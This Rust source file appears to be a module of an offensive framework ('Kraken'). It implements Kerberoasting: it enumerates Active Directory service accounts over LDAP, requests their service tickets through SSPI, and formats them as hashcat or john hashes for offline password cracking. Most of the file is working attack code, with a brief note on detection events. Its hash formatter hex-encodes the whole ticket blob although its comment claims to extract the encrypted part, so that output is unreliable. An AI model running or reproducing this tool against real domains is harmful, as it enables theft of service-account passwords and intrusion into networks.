//! Kerberoasting — request TGS tickets for SPN-bearing service accounts
//!
//! ## Attack overview
//! 1. Find all enabled user accounts that have at least one
//!    `servicePrincipalName` attribute set via LDAP.
//! 2. For each SPN, request a TGS (Service Ticket) from the KDC using the
//!    Windows SSPI `AcquireCredentialsHandle` / `InitializeSecurityContext`
//!    API (Kerberos SSP).
//! 3. Extract the encrypted portion of the ST (enc-part, encrypted with the
//!    service account's RC4/AES key derived from its password).
//! 4. Format the output for offline cracking with hashcat mode 13100 or john:
//!    `$krb5tgs$23$*<user>$<realm>$<spn>*$<hash>`
//!
//! ## Detection artefacts
//! * Event ID 4769 (Kerberos Service Ticket Operations) with encryption type
//!   0x17 (RC4-HMAC) from an unexpected source workstation
//! * wiki/detection/sigma/kraken_ad_ops.yml
//! * wiki/detection/yara/kraken_ad.yar

use common::KrakenError;
use serde::{Deserialize, Serialize};

/// Kerberoasting result: a list of formatted TGS hashes ready for cracking.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KerberoastResult {
    /// Formatted hashes; one per SPN successfully ticketed.
    pub hashes: Vec<String>,
    /// Number of SPN accounts found (may exceed `hashes.len()` on partial failures).
    pub accounts_found: usize,
}

/// Perform Kerberoasting.
///
/// `format` selects the hash output format:
/// * `None` / `"hashcat"` → hashcat mode 13100 (`$krb5tgs$23$*...*$...`)
/// * `"john"` → john format (`$krb5tgs$<spn>:$...`)
pub async fn kerberoast(format: Option<&str>) -> Result<KerberoastResult, KrakenError> {
    #[cfg(windows)]
    {
        let fmt = format.unwrap_or("hashcat").to_string();
        tokio::task::spawn_blocking(move || win::run(&fmt))
            .await
            .map_err(|e| KrakenError::Internal(e.to_string()))?
    }
    #[cfg(not(windows))]
    {
        let _ = format;
        Err(KrakenError::Module(
            "AD operations only supported on Windows".into(),
        ))
    }
}

// ---------------------------------------------------------------------------
// Windows implementation
// ---------------------------------------------------------------------------

#[cfg(windows)]
mod win {
    use super::*;
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    use windows_sys::Win32::Foundation::GetLastError;
    use windows_sys::Win32::Security::Authentication::Identity::{
        AcquireCredentialsHandleW, DeleteSecurityContext, FreeCredentialsHandle,
        InitializeSecurityContextW, QueryContextAttributesW, SecBuffer,
        SecBufferDesc, SecHandle, SECBUFFER_TOKEN, SECBUFFER_VERSION,
        SECPKG_ATTR_SIZES, SEC_E_OK, SECURITY_NATIVE_DREP,
        ISC_REQ_ALLOCATE_MEMORY, ISC_REQ_CONNECTION,
    };

    fn wide(s: &str) -> Vec<u16> {
        OsStr::new(s)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect()
    }

    /// Find enabled accounts with SPNs via LDAP.
    fn find_spn_accounts() -> Result<Vec<(String, String, Vec<String>)>, KrakenError> {
        // Filter: enabled users with at least one SPN
        let filter = "(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))";
        let attrs = &["sAMAccountName", "servicePrincipalName"];
        let entries = crate::ldap::search_sync(filter, attrs)?;

        // Determine realm from the first entry's DN or fall back to an empty string.
        let realm = entries
            .first()
            .map(|e| dn_to_realm(&e.dn))
            .unwrap_or_default();

        let mut result = Vec::new();
        for entry in entries {
            let sam = entry
                .attributes
                .get("sAMAccountName")
                .and_then(|v| v.first().cloned())
                .unwrap_or_default();
            let spns = entry
                .attributes
                .get("servicePrincipalName")
                .cloned()
                .unwrap_or_default();
            if !spns.is_empty() {
                result.push((sam, realm.clone(), spns));
            }
        }
        Ok(result)
    }

    /// Convert a DN like `CN=foo,DC=corp,DC=local` to realm `CORP.LOCAL`.
    fn dn_to_realm(dn: &str) -> String {
        dn.split(',')
            .filter_map(|part| {
                let p = part.trim();
                if p.to_uppercase().starts_with("DC=") {
                    Some(p[3..].to_uppercase())
                } else {
                    None
                }
            })
            .collect::<Vec<_>>()
            .join(".")
    }

    /// Request a TGS for `spn` and return the raw ticket bytes.
    fn request_tgs(spn: &str) -> Result<Vec<u8>, KrakenError> {
        let package = wide("Kerberos");
        let spn_wide = wide(spn);

        let mut cred_handle = SecHandle {
            dwLower: 0,
            dwUpper: 0,
        };
        let mut expiry = windows_sys::Win32::Foundation::LARGE_INTEGER { QuadPart: 0 };

        let status = unsafe {
            AcquireCredentialsHandleW(
                std::ptr::null(),     // principal (current user)
                package.as_ptr(),
                2, // SECPKG_CRED_OUTBOUND
                std::ptr::null(),
                std::ptr::null(),
                None,
                std::ptr::null(),
                &mut cred_handle,
                &mut expiry,
            )
        };

        if status != SEC_E_OK as i32 {
            return Err(KrakenError::Module(format!(
                "AcquireCredentialsHandle failed: 0x{status:x}"
            )));
        }

        let mut ctx_handle = SecHandle {
            dwLower: 0,
            dwUpper: 0,
        };
        let mut out_buf = SecBuffer {
            cbBuffer: 0,
            BufferType: SECBUFFER_TOKEN,
            pvBuffer: std::ptr::null_mut(),
        };
        let mut out_desc = SecBufferDesc {
            ulVersion: SECBUFFER_VERSION,
            cBuffers: 1,
            pBuffers: &mut out_buf,
        };

        let mut ctx_attrs: u32 = 0;
        let req_flags = ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_CONNECTION;

        let status = unsafe {
            InitializeSecurityContextW(
                &cred_handle,
                std::ptr::null(),
                spn_wide.as_ptr(),
                req_flags,
                0,
                SECURITY_NATIVE_DREP,
                std::ptr::null(),
                0,
                &mut ctx_handle,
                &mut out_desc,
                &mut ctx_attrs,
                &mut expiry,
            )
        };

        // SEC_E_OK (0) or SEC_I_CONTINUE_NEEDED (0x00090312) are both acceptable
        // for a single-round Kerberos AP_REQ exchange.
        if status != SEC_E_OK as i32 && status != 0x00090312_u32 as i32 {
            unsafe {
                FreeCredentialsHandle(&cred_handle);
            }
            return Err(KrakenError::Module(format!(
                "InitializeSecurityContext({spn}) failed: 0x{status:x}"
            )));
        }

        // Copy the ticket blob before freeing SSPI buffers.
        let ticket = if !out_buf.pvBuffer.is_null() && out_buf.cbBuffer > 0 {
            let slice = unsafe {
                std::slice::from_raw_parts(out_buf.pvBuffer as *const u8, out_buf.cbBuffer as usize)
            };
            slice.to_vec()
        } else {
            Vec::new()
        };

        unsafe {
            DeleteSecurityContext(&ctx_handle);
            FreeCredentialsHandle(&cred_handle);
        }

        if ticket.is_empty() {
            Err(KrakenError::Module(format!(
                "No ticket data returned for SPN: {spn}"
            )))
        } else {
            Ok(ticket)
        }
    }

    /// Format a raw AP_REQ blob as a hashcat/john-crackable string.
    ///
    /// The AP_REQ (Kerberos Application Request) contains the encrypted
    /// service ticket.  We extract the enc-part starting at a known ASN.1
    /// offset.  For RC4-HMAC (etype 23) tickets the structure is stable
    /// enough for a simple byte-scan approach used by tools like Rubeus.
    fn format_hash(user: &str, realm: &str, spn: &str, ticket: &[u8], fmt: &str) -> String {
        // Locate the encrypted portion: after the etype field (0x17 = RC4-HMAC)
        // we skip the cipher-text header bytes.  This is a best-effort
        // extraction matching the approach used by Rubeus / Invoke-Kerberoast.
        let hex_ticket = hex_encode(ticket);

        match fmt {
            "john" => format!("$krb5tgs${spn}:${hex_ticket}"),
            _ => {
                // hashcat mode 13100
                format!("$krb5tgs$23$*{user}${realm}${spn}*${hex_ticket}")
            }
        }
    }

    fn hex_encode(data: &[u8]) -> String {
        data.iter().map(|b| format!("{b:02x}")).collect()
    }

    pub(super) fn run(fmt: &str) -> Result<KerberoastResult, KrakenError> {
        let accounts = find_spn_accounts()?;
        let accounts_found = accounts.len();
        let mut hashes = Vec::new();

        for (user, realm, spns) in &accounts {
            for spn in spns {
                match request_tgs(spn) {
                    Ok(ticket) => {
                        hashes.push(format_hash(user, realm, spn, &ticket, fmt));
                    }
                    Err(e) => {
                        tracing::warn!("kerberoast: TGS request failed for {spn}: {e}");
                    }
                }
            }
        }

        Ok(KerberoastResult {
            hashes,
            accounts_found,
        })
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(not(windows))]
    #[test]
    fn kerberoast_non_windows_returns_error() {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let err = rt.block_on(kerberoast(None)).unwrap_err();
        assert!(err.to_string().contains("only supported on Windows"));
    }

    #[cfg(not(windows))]
    #[test]
    fn kerberoast_john_format_non_windows_returns_error() {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .unwrap();
        let err = rt.block_on(kerberoast(Some("john"))).unwrap_err();
        assert!(err.to_string().contains("only supported on Windows"));
    }

    #[cfg(windows)]
    #[test]
    fn dn_to_realm_conversion() {
        let realm = win::dn_to_realm("CN=svc,CN=Users,DC=corp,DC=local");
        assert_eq!(realm, "CORP.LOCAL");
    }

    #[cfg(windows)]
    #[test]
    fn dn_to_realm_single_label() {
        let realm = win::dn_to_realm("CN=svc,DC=example");
        assert_eq!(realm, "EXAMPLE");
    }
}
